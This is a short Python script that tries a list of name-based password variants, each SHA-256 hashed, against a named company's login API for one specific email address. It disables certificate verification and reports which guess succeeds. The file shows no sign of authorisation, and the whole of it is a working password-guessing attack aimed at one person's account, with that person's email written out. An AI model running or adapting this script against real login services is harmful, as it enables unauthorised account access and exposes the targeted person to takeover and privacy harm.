
import requests
import hashlib
import urllib3

urllib3.disable_warnings()

URL = "https://authentication.thinxview.com/api/auth/login/"

PASSWORDS = [
    "Aravind@123",
    "Aravind@1234",
    "Aravind@12345",
    "Aravind@12",
    "Aravind123",
    "Aravind1234",
    "Aravind@123 ",
    " Aravind@123"
]

def check(pwd):
    h = hashlib.sha256(pwd.strip().encode()).hexdigest()
    # Note: strip() is used here but I also want to test with spaces if intended.
    # Actually let's NOT strip for the list items that have spaces.
    if pwd.strip() != pwd:
        h = hashlib.sha256(pwd.encode()).hexdigest()
    
    payload = {
        "email": "aravind.m@gndsolutions.in",
        "authMethod": "PASSWORD",
        "password": h,
        "remember_me": True
    }
    try:
        resp = requests.post(URL, json=payload, headers={"Content-Type": "application/json"}, verify=False, timeout=10)
        print(f"Pwd: '{pwd}' -> Status: {resp.status_code}")
        if resp.status_code == 200:
            print(f"SUCCESS! Password is: '{pwd}'")
            return True
    except Exception as e:
        print(f"Pwd: '{pwd}' -> Error: {e}")
    return False

if __name__ == "__main__":
    found = False
    for p in PASSWORDS:
        if check(p):
            found = True
            break
    if not found:
        print("All probes failed.")
